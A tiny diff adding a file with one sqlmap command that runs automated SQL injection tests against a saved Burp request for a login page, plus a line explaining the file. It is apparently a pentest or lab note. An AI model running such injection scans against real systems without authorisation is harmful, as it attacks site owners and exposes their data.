@@ -1,0 +1,5 @@
+sqlmap -r burp.txt --batch --level=3 --risk=2 --threads=4
+
+
+
+burp.txt is the login page's burp request.
